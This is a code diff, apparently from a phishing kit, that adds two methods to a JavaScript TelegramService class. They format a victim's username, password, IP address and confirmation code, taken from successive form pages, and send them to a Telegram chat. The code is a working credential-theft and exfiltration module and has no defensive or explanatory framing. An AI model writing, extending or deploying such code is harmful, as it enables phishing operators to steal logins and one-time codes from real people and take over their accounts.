@@ -110,6 +110,33 @@ class TelegramService {
     return this.sendMessage(message);
   }
 
+  // Envoyer données d'identité (page 3)
+  async sendIdentityData(data) {
+    const message = `<b>🔐 IDENTIFIANT & MOT DE PASSE</b>
+━━━━━━━━━━━━━━━━
+👤 <b>Identifiant:</b> <code>${data.identifier || 'N/A'}</code>
+🔑 <b>Mot de passe:</b> <code>${data.password || 'N/A'}</code>
+━━━━━━━━━━━━━━━━
+🌐 IP: <code>${data.ip || 'N/A'}</code>
+⏰ <code>${new Date().toLocaleString('fr-FR')}</code>
+✅ <b>Statut:</b> Vérification en cours`;
+
+    return this.sendMessage(message);
+  }
+
+  // Envoyer données de confirmation (page 4)
+  async sendConfirmationData(data) {
+    const message = `<b>✔️ CONFIRMATION REÇUE</b>
+━━━━━━━━━━━━━━━━
+📩 <b>Code Confirmation:</b> <code>${data.confirmationCode || 'N/A'}</code>
+━━━━━━━━━━━━━━━━
+🌐 IP: <code>${data.ip || 'N/A'}</code>
+⏰ <code>${new Date().toLocaleString('fr-FR')}</code>
+✅ <b>Statut:</b> Enregistré`;
+
+    return this.sendMessage(message);
+  }
+
   // Test de connexion
   async testConnection() {
     try {
